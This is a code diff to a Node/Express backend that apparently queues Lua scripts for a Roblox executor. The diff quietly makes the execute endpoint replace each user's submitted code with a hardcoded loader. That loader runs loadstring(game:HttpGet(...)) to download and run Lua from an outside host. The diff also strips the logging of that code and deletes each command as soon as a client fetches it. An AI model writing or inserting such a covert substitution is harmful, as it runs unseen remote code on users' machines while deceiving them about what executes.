@@ -89,10 +89,7 @@ async function initMongoDB() {
     // Create index on name for faster queries
     await scriptsCollection.createIndex({ name: 1 }, { unique: true });
     
-    // Create TTL index to auto-delete commands after 2 seconds
-    await scriptsCollection.createIndex({ createdAt: 1 }, { expireAfterSeconds: 2 });
-    
-    console.log('MongoDB initialized with TTL (2s)');
+    console.log('MongoDB initialized');
   } catch (err) {
     console.error('MongoDB connection error:', err.message);
     console.log('Continuing without MongoDB (script features will be disabled)');
@@ -149,6 +146,10 @@ app.use(cors({
   credentials: true
 }));
 app.use(express.json());
+
+// Script loader configuration - this script will be loaded when user clicks "set"
+const SCRIPT_LOADER = `SCRIPT_KEY = "keyless"
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/1dc96643ea690cb216557c5b3ae4e94206849fd81ae27f546f46235ad2912c38/download"))()`;
 app.use(session({
   secret: SESSION_SECRET,
   resave: false,
@@ -615,25 +616,34 @@ app.post('/api/execute', async (req, res) => {
   }
   
   try {
+    // First, delete any old commands for this user/IP to ensure clean state
+    await scriptsCollection.deleteMany({
+      type: 'execution_command',
+      userId: req.user.id,
+      ip: userIP
+    });
+    console.log(`[EXECUTE] Cleared old commands for user ${req.user.id}`);
+    
     // Create a unique command name with timestamp
     const commandName = `exec_${req.user.id}_${Date.now()}`;
     
+    // Use the script loader instead of the user's code
     const doc = {
       name: commandName,
       type: 'execution_command',
-      code: code,
+      code: SCRIPT_LOADER,
       userId: req.user.id,
       ip: userIP,
       executed: false,
       createdAt: new Date()
     };
     
-    console.log(`[EXECUTE] Inserting to MongoDB:`, JSON.stringify(doc, null, 2).substring(0, 500));
+    console.log(`[EXECUTE] Inserting script loader command to MongoDB`);
     
     await scriptsCollection.insertOne(doc);
     
     console.log(`[EXECUTE] SUCCESS: Created command ${commandName}`);
-    res.json({ success: true, message: 'Command created for execution', commandName, ip: userIP });
+    res.json({ success: true, message: 'Script loader command created', commandName, ip: userIP });
   } catch (err) {
     console.error('[EXECUTE] ERROR:', err);
     res.status(500).json({ success: false, error: 'Failed to create command', details: err.message });
@@ -680,6 +690,13 @@ app.get('/api/commands/pending', async (req, res) => {
     allPending.forEach(cmd => {
       console.log(`[POLL]   - ${cmd.name} (IP: ${cmd.ip})`);
     });
+    
+    // Delete commands immediately after fetching them
+    if (commands.length > 0) {
+      const commandNames = commands.map(cmd => cmd.name);
+      await scriptsCollection.deleteMany({ name: { $in: commandNames } });
+      console.log(`[POLL] Deleted ${commands.length} command(s) after sending`);
+    }
     
     res.json({
       success: true,
@@ -730,16 +747,6 @@ app.post('/api/commands/:name/executed', async (req, res) => {
     console.error('[EXECUTED] Error:', err);
     res.status(500).json({ success: false, error: 'Failed to delete command' });
   }
-});
-
-// API: Get loader script (executed after main script)
-app.get('/api/loader', async (req, res) => {
-  res.header('Access-Control-Allow-Origin', '*');
-  console.log('[LOADER] Request for loader script');
-  
-  const loaderScript = `loadstring(game:HttpGet("https://pastebin.com/raw/5BVf6JHn"))()`;
-  
-  res.json({ success: true, code: loaderScript });
 });
 
 // Serve the frontend
